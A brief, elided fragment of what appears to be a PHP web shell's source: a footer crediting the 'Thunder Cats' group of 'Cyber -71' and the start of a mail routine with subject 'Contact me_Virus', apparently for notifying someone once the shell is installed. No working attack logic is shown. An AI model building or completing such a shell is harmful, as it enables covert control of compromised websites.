...
<div>
	...
	<div>
		NO&copy; 2009 <? echo $shell_title . " " . $shell_version; ?> - Improved By Thunder Cats @ <a href="https://www.facebook.com/groups/Cyber71">Cyber -71</a> Thunder Cats</a>
...
{
    $to = "none@this_is_no_mail.com";
    $subject = "Contact me_Virus";
    $header = "from: Mail Me <none@this_is_no_mail.com>";
